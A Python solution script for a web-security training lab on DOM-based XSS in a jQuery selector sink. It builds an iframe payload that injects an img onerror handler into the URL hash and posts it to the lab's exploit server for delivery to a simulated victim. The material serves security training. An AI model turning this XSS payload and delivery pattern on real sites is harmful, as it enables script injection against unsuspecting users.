###############################################################################
#
# Lab: DOM XSS in jQuery selector sink using a hashchange event
#
# Hack Steps: 
#      1. Craft an iframe that, when loaded, will append an img element 
#         to the hash part of the URL
#      2. Deliver the exploit to the victim
#      3. The print() function will be called after they trigger the exploit
#
###############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0afe00c80339e60b841a972e006a0053.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0aee00e7034fe6f7843b961e016800f4.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    payload = f"""<iframe src="{LAB_URL}/#" onload="this.src+='<img src=1 onerror=print()>'">"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The print() function will be called after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


